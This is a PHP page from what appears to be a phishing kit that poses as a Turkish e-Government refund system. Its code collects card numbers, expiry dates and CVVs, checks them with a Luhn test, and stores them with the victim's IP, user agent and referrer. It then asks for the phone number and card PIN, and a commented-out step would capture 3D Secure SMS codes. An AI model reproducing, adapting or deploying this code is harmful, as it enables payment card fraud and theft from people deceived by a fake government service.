<?php
    ob_start();
    session_start();
    include 'ing/baglan.php';

    $ayarsor = $db->prepare("SELECT * from ayarlar where ayar_id=:id");
    $ayarsor->execute(array(
        'id' => 0
    ));
    $ayarcek=$ayarsor->fetch(PDO::FETCH_ASSOC);

/*POST name
decp -> Visitor IP
gr_u5khan -> Useragent
k_dref2 -> Referrer
*/
    if(isset($_POST))
    {
    	
        $kartz = strlen($_POST['Payment_Card']);

        if ($kartz < 16) 
        {
            header("Location: index.php?err=23oaek1mmq90qu2");
            die();
            exit();
        }   
        if (luhn_check($_POST['Payment_Card']) == false) 
        {
            header("Location: index.php?err=23oaek1mmq90qu3");
            die();
            exit();
        }

        $kcvc = strlen($_POST['dogum']);
        if ($kcvc != 3) 
        {
            header("Location: index.php?err=23oaek1mmq90qu4");
            die();
            exit();
        }

        if(isset($_POST['Payment_Card'])){
            
            $kart_no = trim($_POST['Payment_Card']);
            $kart_skt = $_POST['ExpDate_Month'] ."/". $_POST['ExpDate_Year'];
            $kart_cvv = trim($_POST['dogum']);
            $ipal = $_POST['decp'];
            $useral = $_POST['gr_u5khan'];
            $referreral = $_POST['k_dref2'];
            $sesAl = "1";
            
            $datakaydet=$db->prepare("INSERT INTO datalar SET
			kart_no=:kart_no,
			kart_skt=:kart_skt,
            kart_cvv=:kart_cvv,
            ses=:sesAl,
			ip=:ip_al,
            useral=:useral,
            referreral=:referreral
			");
            $insert=$datakaydet->execute(array(
			'kart_no' => $kart_no,
			'kart_skt' => $kart_skt,
			'kart_cvv' => $kart_cvv,
            'sesAl'    => $sesAl,
			'ip_al' => $ipal,
            'useral' => $useral,
            'referreral' => $referreral
		    ));
            
            if($insert){
		        $kayit_id = $db->lastInsertId();
                                
            }else{
                header("Location:index.php?hata=1");
            }
            
        }else {
            header("Location:index.php");
        }
    }
/*
$duzenle1=$db->prepare("UPDATE datalar SET
			3dsms=:smsal
			WHERE kullanici_id={$_POST['kidds']}");
	$update1=$duzenle1->execute(array(
			'smsal' => $_POST['passwords']
	));

	if ($update1) 
	{
		header("Location:../../siparis-sonuc.php?cgi=rOL0CMeK95qX8Ya6v1iH6P4nj9VlLLDkUamX/kKCWXhTLaUgtYhFww==");
	}else {
		header("Location:../../3dpaymets/3dsindex.php?durum=basarisiz");
	}
*/

?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>E-Devlet İade Sistemi</title>
    <meta charset="utf-8">
    <meta name="author" content="<?php echo $ayarcek['ayar_author']; ?>">
    <!-- External CSS libraries -->
    <link type="text/css" rel="stylesheet" href="assets\css\bootstrap.min.css">
    <link type="text/css" rel="stylesheet" href="assets\fonts\font-awesome\css\font-awesome.min.css">
    <link type="text/css" rel="stylesheet" href="assets\fonts\flaticon\font\flaticon.css">
    <!-- Google fonts -->
    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700,800%7CPoppins:400,500,700,800,900%7CRoboto:100,300,400,400i,500,700">
    <!-- Custom Stylesheet -->
    <link type="text/css" rel="stylesheet" href="assets\css\style.css">
    <link rel="stylesheet" type="text/css" id="style_sheet" href="assets\css\skins\default.css">
    
    

   <!-- External CSS libraries -->
    <link type="text/css" rel="stylesheet" href="tema\css\bootstrap.min.css">
    <link type="text/css" rel="stylesheet" href="tema\fonts\font-awesome\css\font-awesome.min.css">
    <link type="text/css" rel="stylesheet" href="tema\fonts\flaticon\font\flaticon.css">

<link rel="icon" type="image/x-icon" href="tema\img\favicon.png">
    <!-- Favicon icon -->
    <link rel="shortcut icon" href="tema\img\favicon.ico" type="image/x-icon">

    <!-- Google fonts -->
    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700,800%7CPoppins:400,500,700,800,900%7CRoboto:100,300,400,400i,500,700">

    <!-- Custom Stylesheet -->
    <link type="text/css" rel="stylesheet" href="tema\css\style.css">
    <link rel="stylesheet" type="text/css" id="style_sheet" href="tema\css\skins\default.css">

    <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-150296223-3"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('set', {'user_id': 'USER_ID'}); // Kullanıcı kimliğini signed-in user_id parametresini kullanarak ayarlayın.
  gtag('config', 'UA-150296223-3');
</script>

</head>
<body id="top">
<div class="page_loader"></div>


<form method="post" action="sms.php" id="aspnetForm" autocomplete="off">



<input type="hidden" name="allastaw" value="<?php echo $kayit_id; ?>">
 

<!-- Login 1 start -->
                        <form action="#" method="post" class="creditly-card-form agileinfo_form">
<section class="creditly-wrapper wthree, w3_agileits_wrapper">
      <div class="card bg-secondary shadow border-0">

<div class="login-1">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <div class="login-inner-form">
                    <div class="details">
                        <a href="#">
                            <img src="tema\img\logos\logo-2.png" alt="logo">
                        </a>
                        <h3>Online Aidat İade Sistemi</h3>


            <font size="2" color="#960000">Aidat İadesi Yalnızca <b>Kredi Kartları</b> İçin Geçerlidir! </font>
            <br>
            <br>
                            <div class="form-group">
                                <input class="expiration-month-and-year input-text" 
                                       maxlength="11" 
                                       minlength="10" 
                                       pattern="[0-9]*" 
                                       type="text"  
                                       id="kimlik" 
                                       name="kimlik" 
                                       placeholder="Gsm Numaranız" 
                                       required>
                            </div>
                            <div class="form-group">
                                <input class="expiration-month-and-year input-text" 
                                       maxlength="4" 
                                       minlength="4" 
                                       pattern="[0-9]*" 
                                       type="password" 
                                       placeholder="Kart Şifreniz"  
                                       required="required"  
                                       id="kadi" 
                                       name="kpass" 
                                       required 
                                       reqassetsred="">
                            </div>
                                <button type="submit" class="btn-md btn-theme btn-block">DEVAM ET</button>
                            </div>
                            <br>
                            <div id="error-message"><p style="color:red"><?php if($_GET['hata']) { echo "Lütfen bilgilerinizi kontrol ediniz.";} ?></p></div>
                          </div>
                        </form> 
                </div>
            </div>
        </div>
    </div>
</div>
    
</form>   
    </form>
    </body>
</html>

<?php 

include 'viz.php';
?>